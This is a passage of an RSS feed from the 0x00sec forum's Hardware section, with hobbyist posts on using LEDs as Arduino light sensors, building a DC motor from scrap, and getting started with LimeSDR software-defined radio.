This is my first Topic in this community <img src="/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"> Today i wanna explain some thing about Light Emitting Diodes (LEDs)<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/8/8a1ba9343d19bd2de2829d955e56c74d857d14b8.jpg"><br>
<strong>Theory:</strong><br>
A Light emitting diode (LED) is essentially a pn junction diode. When carriers are<br>
injected across a forward-biased junction, it emits incoherent light. Most of the<br>
commercial LEDs are realized using a highly doped n and a p Junction.</p>
<p><a href="https://1.bp.blogspot.com/-NocQd42CnbQ/WgO4ZqjwgYI/AAAAAAAAAOY/m_QmSBtUbJgK8APUPVgbOaCxUh_UDuKSACLcBGAs/s640/Sans%2Btitre.bmp" class="onebox" target="_blank" rel="noopener nofollow ugc">https://1.bp.blogspot.com/-NocQd42CnbQ/WgO4ZqjwgYI/AAAAAAAAAOY/m_QmSBtUbJgK8APUPVgbOaCxUh_UDuKSACLcBGAs/s640/Sans%2Btitre.bmp</a></p>
<p>=&gt;Generally LED is simple , but if we add just Arduino Uno3<br>
without any electronic component we can use it for security for example when  it’s detect light in dark , turn on alarm <img src="/images/emoji/twitter/smiling_imp.png?v=9" title=":smiling_imp:" class="emoji" alt=":smiling_imp:"> i was use it  in school <img src="/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"> in my cell <img src="/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"> … anyway we can use this idea in much. it will work like Ultrasonic send waves and if a object in domain waves, will turn on alarm<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/e/e30576ba81d45093603f85f3bc49d6808cb0edb4.png"><br>
But the problem, we know LEDs<br>
just output Light  not input Light by diode.<br>
The Actual Idea we will write a code make for us LED output light and input light in same time then logs changes in Serial Monitor<br>
<strong>Tools :</strong></p>
<ol>
<li>2 LED // LED1 Receive Light (input) and LED2 (Output)</li>
<li>Arduino Uno3</li>
<li>Arduino IDE</li>
<li>and your mind, because i will not be explain some parts. <img src="/images/emoji/twitter/relaxed.png?v=9" title=":relaxed:" class="emoji" alt=":relaxed:"><br>
<strong>Source code :</strong><br>
<a href="https://gist.github.com/vbhs/ca95c36d05b892e1ef97395034b264f8" class="inline-onebox-loading" rel="noopener nofollow ugc">https://gist.github.com/vbhs/ca95c36d05b892e1ef97395034b264f8</a><br>
This is a Video maybe will explain what i mean <img src="/images/emoji/twitter/blush.png?v=9" title=":blush:" class="emoji" alt=":blush:">
</li>
</ol>
<p><a href="https://www.youtube.com/watch?v=vKrIbuOQlFI" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=vKrIbuOQlFI</a></p>
<p>great thanks to all member community <img src="/images/emoji/twitter/wink.png?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            <p><small>16 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/who-think-leds-are-simple/4261">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/who-think-leds-are-simple/4261</link>
          <pubDate>Thu, 09 Nov 2017 03:07:54 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-4261</guid>
          <source url="https://0x00sec.org/t/who-think-leds-are-simple/4261.rss">Who think LEDs Are simple?</source>
        </item>
        <item>
          <title>The Internal Workings of Electric Motors: Episode 1</title>
          <dc:creator><![CDATA[tacodrake95]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>There are a variety of different types of electric motors; However, in this article we’re only going to discuss the two simple rotary types of motors. Those being the AC electric motor and the DC electric motor. The difference between the two being the type of magnet in the outer shell of the motor. In an AC motor the outer, non-rotating magnet is an electromagnet. In a DC motor however, the outer magnet is a so called permanent magnet” which is called this because peoples’ life spans aren’t long enough to realize that it loses its magnetic abilities quite rapidly in the grand scheme of things.</p>
<p>Sorry, tangent over. Let’s start with a DC motor since it’s simpler (in my opinion) to grasp, conceptually. A basic DC motor basically works by having two coils internally (which are connected in series, often times more than two coils for smoother rotation especially with bigger motors) which are connected to plates on opposite sides of the shaft of the motor, curved to match the shaft’s curvature with a small gap between them on both sides of the shaft. This will be clearly visible in the images provided in subsequent episodes.</p>
<p>Then, in cheaper motors springy thin metal pins (the type I’ll be using) or in more expensive motors, a carbon bar with a spring behind it pushing it into the plate on the shaft, precisely positioned to fire the connections in time. I won’t have that luxury since I’m making mine all from scrap. These components are known as “brushes” and I’ll be making mine with some kind of scrap steel and using the same or similar for the contacts on the shaft itself.</p>
<p>Here’s a (somewhat hastily made) animation of the brushes contacting, well, the contacts…<br>
<a href="https://i.imgur.com/ZjfWkFs.gifv" rel="noopener nofollow ugc"> <img src="//0x00sec.s3.amazonaws.com/original/2X/5/5f6a364ad62c336a598fb1670c9a3b646c2b06ed.jpg"></a></p>
<p>The shaft will be a short segment of steel bar that used to be the axle of a remote control car. I’m unsure as to how I’m going to attach the coil mount at this moment, though I’m sure I’ll come up with something soon…I’m thinking zip ties would probably work pretty well. Use an X shape over the crossing bars and cinch them down really tight. This is the initial plan that I intend to try, however the backup plan for its inability to not slide back and forth will be putting some epoxy on and around the joint, making a T shape. Not sure what I’m going to do if that goes to shit. I’ll figure something out.</p>
<p>In the meantime I need to find a way to mount everything. I’m going to use bearings for both ends of the shaft, manufacture the contacts on the shaft and the brushes, wrap the coils using wire from a microwave transformer, probably use wood for the bearing mounts…that might be the easy way to go since I have access to a scroll saw and drill press + lots of hand drills, and find some suitable permanent magnets.</p>
<p>Until then, toodles and happy crafting if you’re building along.</p>
<p>taco signing off o/</p>
            <p><small>4 posts - 2 participants</small></p>
            <p><a href="https://0x00sec.org/t/the-internal-workings-of-electric-motors-episode-1/3620">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/the-internal-workings-of-electric-motors-episode-1/3620</link>
          <pubDate>Sun, 17 Sep 2017 22:16:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3620</guid>
          <source url="https://0x00sec.org/t/the-internal-workings-of-electric-motors-episode-1/3620.rss">The Internal Workings of Electric Motors: Episode 1</source>
        </item>
        <item>
          <title>[Link] LimeSDR Mini Crowdfunding: $99 Early Bird RX/TX, 12-Bit, 10 MHz - 3.5 GHz SDR</title>
          <dc:creator><![CDATA[afiskon]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>This is by all means the best price/quality <a href="https://en.wikipedia.org/wiki/Software-defined_radio" rel="noopener nofollow ugc">SDR</a> for beginners at the moment. If you always wanted to get started with SDR now is the best time to do it.</p>
<aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://www.crowdsupply.com/_teal/images/favicon.ico" class="site-icon" width="32" height="32">
      <a href="https://www.crowdsupply.com/lime-micro/limesdr-mini" target="_blank" rel="noopener nofollow ugc">Crowd Supply</a>
  </header>
  <article class="onebox-body">
    <div class="aspect-image" style="--aspect-ratio:690/388;"><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7978ed22a4636ea5db7ba469a37189e2ec3c7857_2_690x388.jpeg" class="thumbnail" width="690" height="388" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7978ed22a4636ea5db7ba469a37189e2ec3c7857_2_690x388.jpeg, https://0x00sec.s3.amazonaws.com/optimized/2X/7/7978ed22a4636ea5db7ba469a37189e2ec3c7857_2_1035x582.jpeg 1.5x, https://0x00sec.s3.amazonaws.com/optimized/2X/7/7978ed22a4636ea5db7ba469a37189e2ec3c7857_2_1380x776.jpeg 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/7/7978ed22a4636ea5db7ba469a37189e2ec3c7857_2_10x10.png"></div>

<h3><a href="https://www.crowdsupply.com/lime-micro/limesdr-mini" target="_blank" rel="noopener nofollow ugc">LimeSDR Mini</a></h3>

<p>An open, full-duplex, USB stick radio for femtocells and more.</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>UPD: If you never heard of Software Defined Radio I would recommend to watch <a href="http://greatscottgadgets.com/sdr/" rel="noopener nofollow ugc">Software Defined Radio with HackRF</a> course by Michael Ossmann. I find episodes 8 and 11 particularly interesting since in these episodes the concrete examples of using SDR are given.</p>
            <p><small>17 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/link-limesdr-mini-crowdfunding-99-early-bird-rx-tx-12-bit-10-mhz-3-5-ghz-sdr/3591">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/link-limesdr-mini-crowdfunding-99-early-bird-rx-tx-12-bit-10-mhz-3-5-ghz-sdr/3591</link>
          <pubDate>Thu, 14 Sep 2017 11:50:46 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3591</guid>
          <source url="https://0x00sec.org/t/link-limesdr-mini-crowdfunding-99-early-bird-rx-tx-12-bit-10-mhz-3-5-ghz-sdr/3591.rss">[Link] LimeSDR Mini Crowdfunding: $99 Early Bird RX/TX, 12-Bit, 10 MHz - 3.5 GHz SDR</source>
        </item>
        <item>
          <title>A few questions regarding LimeSDR</title>
          <dc:creator><![CDATA[afiskon]]></dc:creator>
          <category>Hardware</category>
          <description><![CDATA[
            <p>Hi!</p>
<p>I’m new to SDR. Only played a little bit with RTL-SDR, nothing serious. Recently I’ve also received LimeSDR. When I’ll find a little free time I’m going to try to reverse-engineer some wireless protocol (I got HC-12, NRF24L01, RadioLink T8FB, Turnigy 6X), mostly just to figure out whether I’m interested in this area.</p>
<p>So I got a few questions:</p>
<ol>
<li>Is there anyone here who also is interested in SDR, especially who has some experience in this area?</li>
<li>I was told that the documentation for LimeSDR currently is pretty raw and in general it’s not trivial to make it work. So I wonder whether there is anyone who successfully used LimeSDR?</li>
<li>What device from the list provided above would you recommend to get started with SDR?</li>
</ol>
            <p><small>6 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/a-few-questions-regarding-limesdr/3142">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/a-few-questions-regarding-limesdr/3142</link>
          <pubDate>Wed, 02 Aug 2017 07:42:05 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>No</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-3142</guid>
          <source url="https://0x00sec.org/t/a-few-questions-regarding-limesdr/3142.rss">A few questions regarding LimeSDR</source>
        </item>
  </channel>
</rss>
